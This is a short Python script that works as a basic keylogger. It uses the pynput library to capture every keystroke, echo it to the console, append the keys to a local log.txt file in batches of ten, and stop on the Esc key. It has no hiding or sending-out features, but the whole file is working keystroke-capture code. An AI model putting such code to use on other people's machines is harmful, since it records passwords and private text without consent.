#!/usr/bin/env python3
"""
project:
created:2022-1-1
@author:seraph1001100
email:seraph1001100@gmail.com
"""


import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []



def on_press(key):
    global keys, count

    keys.append(key)
    count += 1    
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    with open("log.txt", "a") as fo:
        for key in keys:
            k = str(key).replace("'", "")
    
            if k.find("space") > 0:
                fo.write(str('\n'))
            elif k.find("Key") == -1:
                fo.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
